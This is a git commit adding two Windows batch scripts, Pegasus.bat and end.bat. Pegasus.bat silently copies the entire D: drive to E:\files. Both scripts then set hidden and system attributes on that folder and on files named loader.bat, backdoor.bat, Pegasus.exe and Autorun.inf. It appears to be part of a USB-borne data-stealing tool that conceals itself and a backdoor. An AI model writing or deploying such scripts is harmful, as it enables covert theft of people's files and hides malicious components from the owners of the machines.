7f76b62ee40885d7527788b1538cfe1d29252aa8
Krimston <70589107+Krimston@users.noreply.github.com>
2020-10-11 19:25:02 +0300

    Code

---
+++ Pegasus.bat
@@ -0,0 +1,8 @@
+xcopy D:\ E:\files  /f /i /y /s /e /h
+attrib +a +h +s E:\files
+attrib +a +h +s E:\Pegasus.bat
+attrib +a +h +s E:\loader.bat
+attrib +a +h +s E:\backdoor.bat
+attrib +a +h +s E:\end.bat
+attrib +a +h +s E:\Pegasus.exe
+attrib +a +h +s E:\Autorun.inf
---
+++ end.bat
@@ -0,0 +1,5 @@
+attrib +a +h +s E:\files
+attrib +a +h +s E:\Pegasus.bat
+attrib +a +h +s E:\loader.bat
+attrib +a +h +s E:\backdoor.bat
+attrib +a +h +s E:\end.bat
